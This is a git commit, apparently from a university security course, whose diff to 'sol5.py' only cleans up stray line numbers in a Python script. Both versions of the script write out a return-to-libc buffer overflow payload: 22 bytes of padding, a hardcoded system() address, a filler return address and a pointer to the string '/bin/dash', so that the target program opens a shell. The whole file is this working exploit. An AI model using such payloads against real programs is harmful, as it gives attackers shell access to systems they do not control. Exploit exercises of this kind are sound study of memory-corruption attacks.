c55646553d76920c6a137eb58943564aa7edccfe
marymx <marymx@umich.edu>
2022-03-31 18:55:45 +0000

    Automatic commit by test script for marymx yaoche

--- sol5.py
+++ sol5.py
@@ -1,5 +1,5 @@
 import sys
-2	
-3	addr = 0x804fef0.to_bytes(4, "little") #system address
-4	addr2 = 0xfff6b998.to_bytes(4, "little") #shellcode string
-5	sys.stdout.buffer.write(b"A" * 22 + addr + b"f"*4 + addr2 + b"/bin/dash")
+
+addr = 0x804fef0.to_bytes(4, "little") #system address
+addr2 = 0xfff6b998.to_bytes(4, "little") #shellcode string
+sys.stdout.buffer.write(b"A" * 22 + addr + b"f"*4 + addr2 + b"/bin/dash")
